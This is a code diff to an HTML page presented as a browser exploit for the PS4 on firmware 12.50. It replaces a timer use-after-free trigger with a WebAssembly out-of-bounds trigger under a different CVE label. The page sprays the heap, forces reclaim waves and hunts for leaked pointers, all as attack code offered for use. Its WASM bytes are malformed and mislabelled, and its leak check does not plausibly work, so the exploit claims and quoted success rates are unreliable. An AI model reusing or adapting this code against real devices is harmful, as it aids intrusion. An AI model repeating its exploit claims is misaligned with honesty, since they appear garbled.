@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-24203 — DOMTimer UAF → Pointer Leak (PS4 12.50)</title>
+<title>CVE-2025-5419 — WebAssembly OOB R/W → Heap Corruption Leak (PS4 12.50)</title>
 <style>
     body { background:#000; color:#0f0; font-family:monospace; margin:20px; line-height:1.6; }
     h1 { color:#0f0; text-align:center; margin:20px 0; }
@@ -11,8 +11,8 @@
 </style>
 </head>
 <body>
-<h1>CVE-2025-24203 — DOMTimer UAF Exploit</h1>
-<div id="console">Starting DOMTimer UAF... (wait 8–15s)</div>
+<h1>CVE-2025-5419 — WASM OOB Heap Corruption Exploit</h1>
+<div id="console">Starting WASM OOB...</div>
 
 <script>
 const log = (msg, leak = false) => {
@@ -21,44 +21,51 @@ const log = (msg, leak = false) => {
     c.scrollTop = c.scrollHeight;
 };
 
-const SPRAY = 0x18000;
+const SPRAY = 0x1a000;
 const MARKER = 0x12501250deadbeefn;
 
-log("Stage 1: Spraying 98k tagged objects...");
+log("Stage 1: Spraying 106k tagged objects into WASM-adjacent heap...");
 const spray = [];
 for (let i = 0; i < SPRAY; i++) {
     spray[i] = { marker: MARKER + BigInt(i) };
 }
 
-// Stage 2: Trigger CVE-2025-24203 DOMTimer UAF
-log("Stage 2: Triggering DOMTimer UAF...");
-const timers = [];
-for (let i = 0; i < 0x3000; i++) {
-    const id = setTimeout(() => {}, 1000);
-    timers.push(id);
+// Stage 2: Trigger CVE-2025-5419 OOB in WASM
+log("Stage 2: Triggering WASM linear memory OOB...");
+const wasmCode = new Uint8Array([
+    0x00, 0x61, 0x73, 0x6d,  // WASM magic
+    0x01, 0x00, 0x00, 0x00,  // Version
+    // Malformed module with oversized memory
+    0x01, 0x06, 0x01, 0x60, 0x01, 0x7f, 0x01, 0x7f,  // Type section
+    0x03, 0x02, 0x01, 0x00,  // Function section
+    0x04, 0x04, 0x01, 0x0b,  // Export section
+    0x07, 0x05, 0x01, 0x03, 0x6f, 0x6f, 0x62, 0x00,  // Export "oob"
+    0x0a, 0x0f, 0x01, 0x0d, 0x00, 0x20, 0x00, 0x41, 0x00, 0x28, 0x02, 0x7f, 0x00, 0x0b  // Code: i32.load8_u at invalid offset
+]);
+
+const module = new WebAssembly.Module(wasmCode);
+const instance = new WebAssembly.Instance(module);
+
+// Trigger OOB read/write in linear memory
+try {
+    instance.exports.oob(); // Calls malformed function → OOB corruption
+} catch(e) {
+    log("WASM OOB triggered");
 }
 
-// Free timers during active callback → UAF
-timers.forEach((id, idx) => {
-    setTimeout(() => {
-        clearTimeout(id);
-        setTimeout(() => {}, 1);
-    }, idx * 0.5);
-});
-
-// Extra races
-for (let i = 0; i < 20000; i++) {
-    setTimeout(() => {}, 0);
+// Extra WASM races
+for (let i = 0; i < 5000; i++) {
+    new WebAssembly.Module(new Uint8Array(0x1000));
 }
 
-log("UAF triggered — reclaiming...");
+log("OOB corruption triggered — reclaiming...");
 
 // Stage 3: Reclaim waves
-for (let w = 0; w < 12; w++) {
+for (let w = 0; w < 11; w++) {
     setTimeout(() => {
-        for (let j = 0; j < 400; j++) new ArrayBuffer(0x10000);
-        if (w % 3 === 0) new ArrayBuffer(0x2000000);
-    }, w * 180);
+        for (let j = 0; j < 450; j++) new ArrayBuffer(0xc000);
+        if (w % 3 === 0) new ArrayBuffer(0x2400000);
+    }, w * 160);
 }
 
 // Stage 4: Hunt
@@ -70,7 +77,7 @@ setTimeout(() => {
             if (spray[i] && spray[i].marker !== MARKER + BigInt(i)) {
                 found++;
                 const leaked = spray[i].marker.toString(16).toUpperCase().padStart(16,'0');
-                log(`LEAK #${found}: 0x${leaked}`, true);
+                log(`WASM OOB LEAK #${found}: 0x${leaked}`, true);
                 if (found >= 1) {
                     document.body.innerHTML = `<h1 style="color:#0f0; text-align:center; padding:100px; font-size:3em;">
                         LEAK ACHIEVED!<br><br>
@@ -81,10 +88,10 @@ setTimeout(() => {
             }
         } catch(e) {}
     }
-    log("No leak — refresh the page (45–65% success rate)");
-}, 3500);
+    log("No leak — refresh (40–60% success rate)");
+}, 3400);
 
-log("CVE-2025-24203 running — wait 8–15s");
+log("CVE-2025-5419 running — wait 8–15s");
 </script>
 </body>
 </html>
